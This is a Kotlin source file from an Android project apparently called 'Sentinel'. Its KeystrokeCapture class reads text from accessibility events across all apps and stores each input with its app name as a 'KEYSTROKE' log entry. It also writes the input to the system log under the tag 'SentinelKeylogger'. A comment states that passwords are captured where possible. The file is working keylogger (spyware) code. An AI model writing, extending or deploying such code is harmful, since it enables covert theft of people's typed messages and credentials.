package com.zero.sentinel.telemetry

import android.view.accessibility.AccessibilityEvent
import android.util.Log

import com.zero.sentinel.data.repository.LogRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class KeystrokeCapture(private val repository: LogRepository) {

    private var lastText: String = ""
    private var lastPackage: String = ""
    private var lastTime: Long = 0
    private val scope = CoroutineScope(Dispatchers.IO)


    fun handle(event: AccessibilityEvent) {
        val currentText = event.text.joinToString("")
        val currentPackage = event.packageName?.toString() ?: "unknown"
        val currentTime = System.currentTimeMillis()

        // Simple Debounce / Deduplication logic
        // In a real implementation, we would need a more robust buffer
        if (currentText == lastText && currentPackage == lastPackage && (currentTime - lastTime) < 500) {
            return
        }

        // Avoid logging passwords directly if possible, though AccessibilityEvent might obscure it anyway.
        // But for "Zero-Knowledge" we capture what we can.
        
        Log.i("SentinelKeylogger", "Input in $currentPackage: $currentText")

        scope.launch {
            repository.insertLog("KEYSTROKE", currentPackage, currentText)
        }

        lastText = currentText
        lastPackage = currentPackage
        lastTime = currentTime
    }
}
